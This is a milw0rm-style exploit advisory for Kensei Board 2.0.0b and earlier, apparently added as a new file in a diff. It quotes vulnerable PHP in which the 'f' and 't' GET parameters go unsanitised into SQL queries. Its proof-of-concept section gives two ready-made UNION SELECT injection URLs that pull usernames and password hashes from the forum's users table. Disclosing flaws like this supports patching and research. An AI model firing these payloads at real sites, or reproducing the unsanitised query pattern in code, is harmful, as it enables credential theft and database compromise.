@@ -1,0 +1,46 @@
+Kensei Board <= 2.0.0b Multiple Remote SQL Injection Vulnerabilities
+Bug found && Exploited by cOndemned
+Greetz: SELECT * FROM `friends`
+
+Download Script : http://www.kenseiboard.com/counter/click.php?id=2
+
+---
+
+source of index.php :
+
+	[...]
+
+	87.	if ($inc_function == "_showforum") {
+
+	88.		if ($_GET[t] == "") {
+
+	89.			$inc_function = "functions/showforum.php";
+
+	90.		} else {
+
+	91.			$inc_function = "functions/showtopic.php";
+
+	[...]
+
+source of functions/showforum.php :
+
+	[...]
+
+	9.	$forum = @mysql_fetch_array(@mysql_query("select * from $_CON[prefix]forums where forums_id = $_GET[f]"));
+
+	[...]
+
+It looks the same for "t" variable ...
+
+---
+
+Proof of Concept :
+
+	"f" variable: /index.php?&act=showforum&f=1+and+1=51+union+select+1,2,3,concat_ws(char(58),users_username,users_password),5,6,7,8+from+ksb_users--
+	"t" variable: /index.php?&act=showforum&f=1&t=1+and+1=51+union+select+1,2,3,4,5,6,7,8,9,10,concat_ws(char(58),users_username,users_password)+from+ksb_users--
+
+---
+
+// http://www.youtube.com/watch?v=xCMlZxqZ5xI
+
+# milw0rm.com [2009-05-26]
